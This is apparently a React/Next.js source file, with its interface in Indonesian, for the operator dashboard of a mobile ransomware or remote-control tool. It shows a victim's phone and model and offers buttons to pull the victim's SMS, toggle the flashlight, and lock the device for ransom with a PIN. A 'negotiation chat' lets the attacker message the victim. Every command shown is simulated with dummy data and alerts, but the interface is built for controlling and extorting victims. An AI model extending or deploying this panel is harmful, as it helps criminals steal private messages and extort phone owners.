"use client";
import { useState, useEffect } from "react";
import { useParams } from "next/navigation";
import { dummyVictims, dummySMS, dummyChats, SMS, ChatMessage } from "@/lib/dummyData";

export default function VictimControlPage() {
  const params = useParams();
  const id = params.id as string;
  const victim = dummyVictims.find((v) => v.id === id);
  const [sms, setSms] = useState<SMS[]>([]);
  const [flashOn, setFlashOn] = useState(false);
  const [lockPin, setLockPin] = useState("");
  const [chat, setChat] = useState<ChatMessage[]>([]);
  const [newMsg, setNewMsg] = useState("");

  useEffect(() => {
    setSms(dummySMS[id] || []);
    setChat(dummyChats[id] || []);
  }, [id]);

  const sendCommand = (cmd: string) => {
    alert(`Perintah "${cmd}" dikirim ke ${victim?.phone} (Simulasi)`);
    if (cmd === "flashlight_on") setFlashOn(true);
    if (cmd === "flashlight_off") setFlashOn(false);
    if (cmd === "lock") {
      // dummy lock
      setLockPin(String(Math.floor(1000 + Math.random() * 9000)));
      alert(`Device terkunci, PIN: ${lockPin}`);
    }
    if (cmd === "unlock") {
      alert(`Mencoba unlock dengan PIN: ${lockPin}`);
    }
  };

  const sendChat = () => {
    if (!newMsg.trim()) return;
    const msg: ChatMessage = { sender: "attacker", text: newMsg, timestamp: Date.now() };
    setChat([...chat, msg]);
    setNewMsg("");
    // simulasi balasan
    setTimeout(() => {
      setChat((prev) => [...prev, { sender: "victim", text: "Ok, saya mengerti.", timestamp: Date.now() }]);
    }, 2000);
  };

  if (!victim) return <div className="text-red-400">Victim not found</div>;

  return (
    <div className="max-w-5xl mx-auto">
      <div className="flex items-center justify-between mb-6">
        <div>
          <h2 className="text-2xl font-bold">{victim.phone}</h2>
          <p className="text-gray-400">{victim.model}</p>
        </div>
        <span className={`px-3 py-1 text-sm rounded ${victim.locked ? "bg-red-900 text-red-300" : "bg-green-900 text-green-300"}`}>
          {victim.locked ? "🔒 Locked" : "🟢 Online"}
        </span>
      </div>

      {/* Quick Actions */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
        <button onClick={() => sendCommand("read_sms")} className="bg-blue-700 hover:bg-blue-800 p-4 rounded-lg text-white font-medium transition">
          📩 Get SMS
        </button>
        <button
          onClick={() => sendCommand(flashOn ? "flashlight_off" : "flashlight_on")}
          className={`p-4 rounded-lg font-medium transition ${flashOn ? "bg-yellow-600 hover:bg-yellow-700" : "bg-gray-700 hover:bg-gray-600"} text-white`}
        >
          {flashOn ? "🔦 Matikan Senter" : "🔦 Nyalakan Senter"}
        </button>
        <button onClick={() => sendCommand("lock")} className="bg-red-700 hover:bg-red-800 p-4 rounded-lg text-white font-medium transition">
          🔐 Kunci & Ransom
        </button>
        <div className="flex gap-2">
          <input
            type="text"
            value={lockPin}
            onChange={(e) => setLockPin(e.target.value)}
            placeholder="PIN unlock"
            className="w-24 bg-gray-800 border border-gray-700 rounded px-3 py-2 text-sm text-white"
          />
          <button onClick={() => sendCommand("unlock")} className="bg-green-700 hover:bg-green-800 px-4 py-2 rounded-lg text-white font-medium transition">
            Buka
          </button>
        </div>
      </div>

      {/* SMS Panel */}
      <div className="bg-gray-900 border border-gray-800 rounded-lg p-5 mb-8">
        <h3 className="text-lg font-semibold mb-3">📨 SMS Terakhir</h3>
        {sms.length === 0 ? (
          <p className="text-gray-500">Tidak ada SMS.</p>
        ) : (
          <ul className="space-y-2">
            {sms.map((s, i) => (
              <li key={i} className="border-b border-gray-800 pb-2 last:border-0">
                <span className="text-cyan-400 text-sm">{s.address}</span>
                <p className="text-gray-300 text-sm">{s.body}</p>
                <span className="text-gray-600 text-xs">{s.date}</span>
              </li>
            ))}
          </ul>
        )}
      </div>

      {/* Chat Negosiasi */}
      <div className="bg-gray-900 border border-gray-800 rounded-lg p-5">
        <h3 className="text-lg font-semibold mb-3">💬 Chat Negosiasi</h3>
        <div className="h-64 overflow-y-auto bg-gray-950 rounded p-3 mb-3 space-y-2">
          {chat.map((msg, idx) => (
            <div key={idx} className={`flex ${msg.sender === "attacker" ? "justify-end" : "justify-start"}`}>
              <div className={`max-w-[80%] px-4 py-2 rounded-lg text-sm ${
                msg.sender === "attacker" ? "bg-cyan-800 text-white" : "bg-gray-700 text-gray-200"
              }`}>
                <p className="font-medium mb-1">{msg.sender === "attacker" ? "Kamu" : victim.phone}</p>
                <p>{msg.text}</p>
              </div>
            </div>
          ))}
        </div>
        <div className="flex gap-2">
          <input
            value={newMsg}
            onChange={(e) => setNewMsg(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && sendChat()}
            className="flex-1 bg-gray-800 border border-gray-700 rounded px-4 py-2 text-sm text-white focus:outline-none focus:border-cyan-500"
            placeholder="Ketik pesan..."
          />
          <button onClick={sendChat} className="bg-cyan-600 hover:bg-cyan-700 px-5 py-2 rounded text-white font-medium transition">
            Kirim
          </button>
        </div>
      </div>
    </div>
  );
}
